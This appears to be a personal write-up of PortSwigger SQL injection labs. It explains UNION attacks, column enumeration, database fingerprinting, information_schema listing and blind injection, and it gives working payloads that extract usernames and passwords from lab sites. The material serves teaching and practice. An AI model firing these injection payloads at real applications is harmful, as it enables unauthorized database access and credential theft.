# 🕌 SQL injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

#### SQL injection UNION attacks

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query

#### Determining the number of columns required

injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

`' ORDER BY 1--`&#x20;

`' ORDER BY 2--`&#x20;

`' ORDER BY 3--`&#x20;

`etc.`

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

`' UNION SELECT NULL--`&#x20;

`' UNION SELECT NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL--`&#x20;

`etc.`

If the number of nulls does not match the number of columns, the database returns an error

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

so for this one i just did some recon and looked for the number of columns with the union select parameter, adding NULL variables until it doesn't error out:

<figure><img src="../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>

#### Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose.

```
' UNION SELECT NULL FROM DUAL--
```

other DB specific syntax:[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL--`&#x20;

`' UNION SELECT NULL,'a',NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,'a',NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error,

### Lab: SQL injection UNION attack, finding a column containing text

for this one i first determined the number of columns, it took me 3 NULL's to bypass the error, i then inputted the requested string in the different columns to finally solve the lab:

<figure><img src="../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>

#### Using a SQL injection UNION attack to retrieve interesting data

### Lab: SQL injection UNION attack, retrieving data from other tables

<figure><img src="../.gitbook/assets/image (835).png" alt=""><figcaption></figcaption></figure>

So we are given all the informations needed to construct our sqli,&#x20;

<figure><img src="../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>

and on the webpage we got:

<figure><img src="../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>

and you just need to connect with those creds to solve lab

#### Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together with a separator. On oracle, the syntax would be:

```
' UNION SELECT username || '~' || password FROM users--
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

i start by figuring out how many columns:

<figure><img src="../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>

then which one is the good column:

<figure><img src="../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>

and final payload ->

<figure><img src="../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

#### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

<figure><img src="../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

We start by looking for the number of columns:

<figure><img src="../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>

and try to print the version

<figure><img src="../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>

#### Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

We start by looking at the interesting tables

```
GET /filter?category=Lifestyle' UNION SELECT table_name, null FROM information_schema.tables--
```

<figure><img src="../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>

then check the columns in that table to print out the interesting values

```
GET /filter?category=Lifestyle' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_znlzdn'--
```

<figure><img src="../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>

```
GET /filter?category=Lifestyle' UNION SELECT username_fjtbql, password_mjqvpb FROM users_znlzdn--
```

<figure><img src="../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>

#### Blind SQL injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses.

### Lab: Blind SQL injection with conditional responses

When we don't input well the sqli, the "Welcome back" message does not pop:

<figure><img src="../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>

but when we input it well ->

<figure><img src="../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

